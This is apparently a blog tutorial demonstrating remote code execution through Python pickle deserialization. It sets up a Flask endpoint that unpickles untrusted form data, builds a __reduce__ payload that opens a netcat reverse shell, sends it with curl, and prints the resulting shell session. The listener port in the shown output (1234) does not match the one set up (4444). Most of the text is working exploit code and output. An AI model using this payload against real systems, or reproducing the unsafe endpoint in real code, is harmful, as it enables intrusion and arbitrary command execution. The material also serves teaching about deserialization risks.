# Python: Exploiting de-serialization to achieve RCE

The [`pickle` module](https://docs.python.org/3/library/pickle.html) implements binary protocols for serializing and de-serializing a Python object structure.

The documentation for `pickle` module comes with red box of warning:

> Warning The pickle module is not secure. Only unpickle data you trust.
It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.

In this post, I will try to demonstrate how remote code executation can be achieved by exploiting `pickle` on a flask based web application.

## Setup basic flask application

- Create virtual env
```
python3 -m venv venv
source venv/bin/activate

pip install flask
```
- Create app.py
```
from flask import Flask, request
import base64
import pickle

app = Flask(__name__)

@app.route('/pickler', methods=["POST"])
def pickler():
    data = base64.urlsafe_b64decode(request.form['pickled'])
    deserialized_data = pickle.loads(data)
    return ''
```
- Run the app
```
export FLASK_APP=app.py
flask run
```

## Create payload for the RCE
```
# exploit.py

import pickle
import base64
import os


class RCE(object):
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 4444 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))

```

By implementing `__reduce__` in a class whose instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.

The code executed will create a reverse shell back to our localhost at port 4444

Let's generate the payload by running above code:

```
python exploit.py
Y3Bvc2l4CnN5c3RlbQpwMAooUydybSA...
```
## Exploit

```
# create a listner
nc -nvvl 4444

# send payload
curl -d "pickled=Y3Bvc2l4CnN5c3RlbQpwMAooUydybSA..." http://127.0.0.1:5000/pickler

# watch the listner for connection

nc -nvvvl 1234
sh: no job control in this shell
sh-3.2$ id
uid=501(raj3shp)
```
